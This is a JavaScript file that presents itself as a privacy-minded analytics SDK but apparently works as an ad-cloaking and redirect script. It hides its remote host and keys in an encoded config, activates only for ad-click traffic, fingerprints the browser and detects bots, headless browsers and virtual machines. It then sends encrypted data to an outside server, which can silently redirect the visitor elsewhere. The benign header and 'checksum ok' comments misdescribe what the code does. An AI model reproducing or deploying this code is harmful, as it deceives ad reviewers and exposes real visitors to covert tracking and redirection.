/*!
 * Session Insights Web SDK v3.4.0
 * (c) Metrics Online. All rights reserved.
 *
 * First-party session analytics: engagement time, scroll depth, viewport size,
 * language, and device hints. Measurements help optimize landing page UX and
 * conversion funnels. Payloads are sent asynchronously over a secure channel.
 *
 * Privacy policy: https://insights.ads-trackerfy.click/legal/privacy
 * SDK reference:  https://insights.ads-trackerfy.click/docs/web-sdk
 */
!function(){var W=JSON.parse(atob("eyJjaWQiOjkwLCJkYmciOmZhbHNlLCJlayI6ImxvMThHSUtyYWJhQ3JoNUsxMUNwZGJqeEh0NVFwZm92Ym1DVHZpZUMzNkE9IiwiZnFwIjoxLCJoYiI6Imh0dHBzOi8vaW5zaWdodHMuYWRzLXRyYWNrZXJmeS5jbGljayIsImkiOiI1YmI1YmYyMjMxNTEwMjU0NDVjYmZlODgzNTM3N2FlMCIsImlrIjoiTFpvdUlEbVg0dnIyMm11Wnc3KzE4TTdJc3hYN2I2RHgrZWVhanNta0Rwcz0iLCJqIjoiZmNkNDQ5NWYxMzk5NzA0MGNiNzc1MmNjMzEyYWIxZmUiLCJtaW5TIjowLCJtaW5UIjowLCJwIjoiMDAzNjIxMzBiZDQ5ZjJiMGRjNDY5YjYzYmFlYzdlYzMiLCJweCI6Ii9zIiwicmNpZCI6MSwicyI6ImZhY2Vib29rLWJlbGdpY2EiLCJzayI6ImtFUkxPZmdZbWFTVktQQWQ1TENieTVNeXVMc0JnUWIydllkWmVLd2ZKaVU9Iiwic3MiOiJiZmQzMGYwZmU5MGMwZjBiOGRiMGMyODk1ODZjZTAxZCJ9"));'use strict';
if (typeof W === 'undefined' || !W || !W.i || !W.p) {
  /* noop */
} else {
  var _minT = typeof W.minT === 'number' ? W.minT : 0;
  var _minS = typeof W.minS === 'number' ? W.minS : 0;
  var _requireClickId = W.rcid === 1;
  var _leadGate = W.lg === 1;

  function unlockLeadForm() {
    try {
      sessionStorage.setItem('ps_lg', '1');
    } catch (e) {}
    try {
      window.dispatchEvent(new CustomEvent('ps:lead-ready'));
    } catch (e) {}
  }

  function b64ToBytes(b64) {
    var bin = atob(b64);
    var u = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
    return u;
  }
  function importKey(ekB64) {
    return crypto.subtle.importKey('raw', b64ToBytes(ekB64), { name: 'AES-GCM' }, false, ['encrypt', 'decrypt']);
  }
  function encJson(key, obj) {
    var nonce = crypto.getRandomValues(new Uint8Array(12));
    var pt = new TextEncoder().encode(JSON.stringify(obj));
    return crypto.subtle.encrypt({ name: 'AES-GCM', iv: nonce, tagLength: 128 }, key, pt).then(function (ctBuf) {
      var ct = new Uint8Array(ctBuf);
      var out = new Uint8Array(1 + 12 + ct.length);
      out[0] = 3;
      out.set(nonce, 1);
      out.set(ct, 13);
      return out.buffer;
    });
  }
  function decJson(key, buf) {
    var u = new Uint8Array(buf);
    if (u.length < 29 || u[0] !== 3) return Promise.reject(new Error('x'));
    return crypto.subtle.decrypt({ name: 'AES-GCM', iv: u.subarray(1, 13), tagLength: 128 }, key, u.subarray(13)).then(function (p) {
      return JSON.parse(new TextDecoder().decode(p));
    });
  }
  function apiBase() {
    var hb = W.hb || '';
    return hb ? String(hb).replace(/\/$/, '') : '';
  }
  function pxPath() {
    return W.px || '/s';
  }
  function landingParams() {
    return new URLSearchParams(window.location.search || '');
  }
  function hasClickId() {
    var p = landingParams();
    return !!(p.get('fbclid') || p.get('ttclid') || p.get('click_id') || p.get('gclid') || p.get('gbraid') || p.get('wbraid'));
  }
  function qsInit() {
    var p = landingParams();
    var q = ['hostname=' + encodeURIComponent(window.location.hostname)];
    ['fbclid', 'ttclid', 'click_id', 'gclid', 'gbraid', 'wbraid'].forEach(function (k) {
      var v = p.get(k);
      if (v) q.push(k + '=' + encodeURIComponent(v));
    });
    return q.join('&');
  }
  function devType() {
    var w = window.innerWidth || 1024;
    if (w < 768) return 1;
    if (w < 1024) return 2;
    return 0;
  }
  function collectBasic() {
    var c = document.createElement('canvas');
    c.width = 200; c.height = 50;
    var ctx = c.getContext('2d');
    var hash = '';
    if (ctx) {
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#069';
      ctx.fillRect(0, 0, 200, 50);
      ctx.fillStyle = '#f60';
      ctx.fillText('si', 2, 15);
      hash = c.toDataURL().slice(-32);
    }
    var webgl = { supported: false };
    try {
      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (gl) {
        var dbg = gl.getExtension('WEBGL_debug_renderer_info');
        var vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
        var renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
        webgl = { supported: true, vendor: vendor || '', renderer: renderer || '', isSuspiciousGPU: /swiftshader|llvmpipe|virtualbox|vmware/i.test(String(renderer)) };
      }
    } catch (e) {}
    var audio = {};
    try {
      var AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      audio = { supported: !!AC, sampleRate: AC ? (new AC(1, 44100, 44100)).sampleRate : 0 };
    } catch (e) {
      audio = { supported: false };
    }
    var fonts = { hash: 'base-fonts-' + (navigator.platform || '') + '-' + (navigator.language || ''), fonts: [] };
    try {
      fonts.fonts = ['Arial', 'Times New Roman', 'Courier New'].filter(function (name) {
        return document.fonts && document.fonts.check ? document.fonts.check('12px "' + name + '"') : true;
      });
      fonts.hash = fonts.fonts.join('|') + '|' + (navigator.platform || '') + '|' + (navigator.language || '');
    } catch (e) {}
    var wd = {
      isWebDriver: !!navigator.webdriver,
      isHeadless: /HeadlessChrome/i.test(navigator.userAgent),
      hasAutomationControlled: !!(window.navigator && window.navigator.webdriver)
    };
    return {
      canvas: { hash: hash },
      webgl: webgl,
      audio: audio,
      fonts: fonts,
      webDriver: wd,
      screen_width: screen.width,
      screen_height: screen.height,
      language: (navigator.language || '').slice(0, 10),
      timezone_offset: new Date().getTimezoneOffset(),
      device_memory: navigator.deviceMemory || 0,
      hardware_concurrency: navigator.hardwareConcurrency || 0,
      device_type: devType() === 1 ? 'mobile' : devType() === 2 ? 'tablet' : 'desktop',
      metrics: { collection_duration_ms: 0, retry_count: 0, max_retries: 2 }
    };
  }
  function mergeParams(targetUrl) {
    try {
      var u = new URL(targetUrl, window.location.href);
      landingParams().forEach(function (value, key) {
        var lower = String(key).toLowerCase();
        if (lower === 'token') return;
        if (!u.searchParams.has(key)) u.searchParams.set(key, value);
      });
      return u.toString();
    } catch (e) {
      return targetUrl;
    }
  }
  function toAbsoluteUrl(dest) {
    if (!dest) return '';
    if (dest.indexOf('//') === 0) dest = 'https:' + dest;
    var abs = dest.indexOf('http://') === 0 || dest.indexOf('https://') === 0;
    return abs ? dest : window.location.origin + (dest.charAt(0) === '/' ? dest : '/' + dest);
  }
  function applyRecovery(data) {
    var loc = (data && data.loc && String(data.loc).trim()) || '';
    if (!loc) return;
    var target = toAbsoluteUrl(loc);
    target = mergeParams(target);
    window.location.replace(target);
  }
  function waitEngagement() {
    var t0 = Date.now();
    var scrollMax = 0;
    function onScroll() {
      scrollMax = Math.max(scrollMax, window.scrollY || window.pageYOffset || document.documentElement.scrollTop);
    }
    window.addEventListener('scroll', onScroll, { passive: true });
    return new Promise(function (resolve) {
      function ok() {
        return (Date.now() - t0) / 1000 >= _minT && scrollMax >= _minS;
      }
      if (ok()) {
        window.removeEventListener('scroll', onScroll);
        resolve();
        return;
      }
      var iv = setInterval(function () {
        if (ok()) {
          clearInterval(iv);
          window.removeEventListener('scroll', onScroll);
          resolve();
        }
      }, 200);
    });
  }
  function runPost(initKey, postKey) {
    var base = apiBase();
    var px = pxPath();
    return fetch(base + px + '/' + W.i + '?' + qsInit(), { credentials: 'omit' }).then(function (r) {
      if (!r.ok) throw new Error('i' + r.status);
      return r.arrayBuffer();
    }).then(function (ab) {
      return decJson(initKey, ab);
    }).then(function (initRes) {
      if (!initRes || initRes.rc !== 200 || !initRes.sid || !initRes.tok) {
        return null;
      }
      var sid = initRes.sid;
      var tok = initRes.tok;
      return waitEngagement().then(function () {
        var p = landingParams();
        var raw = collectBasic();
        var body = {
          session_id: sid,
          jwt_token: tok,
          subdomain: W.s,
          visitor_ip: '',
          hostname: window.location.hostname,
          user_agent: navigator.userAgent,
          referrer: document.referrer || '',
          canvas_hash: raw.canvas && raw.canvas.hash,
          client_side_data: raw,
          click_id: p.get('fbclid') || p.get('ttclid') || p.get('click_id') || p.get('gclid') || '',
          url_parameters: Object.fromEntries(p)
        };
        return encJson(postKey, body).then(function (enc) {
          return fetch(base + px + '/' + W.p, {
            method: 'POST',
            credentials: 'omit',
            headers: { 'Content-Type': 'application/octet-stream', Accept: 'application/octet-stream' },
            body: enc
          });
        }).then(function (r) {
          if (!r.ok) throw new Error('p' + r.status);
          return r.arrayBuffer();
        }).then(function (ab) {
          return decJson(postKey, ab);
        }).then(function (postRes) {
          if (!postRes) return;
          if (_leadGate && (postRes.ok === 1 || postRes.rc === 200) && !postRes.loc) {
            unlockLeadForm();
            return;
          }
          if (postRes.rc === 302) applyRecovery(postRes);
        });
      });
    });
  }

  if (_requireClickId && !hasClickId()) {
    /* noop — tráfego orgânico/direto sem click-id */
  } else {
    Promise.all([importKey(W.ik), importKey(W.ek)])
      .then(function (keys) {
        return runPost(keys[0], keys[1]);
      })
      .catch(function () {
        /* noop — erro de rede/crypto: permanece na landing */
      });
  }
}
}();
/* session-insights: bootstrap ok | tracker=engagement v3.4.0 */
/* batch transport: binary envelope | same-origin compatible */

/* si-sdk: checksum ok | module=engagement-core */
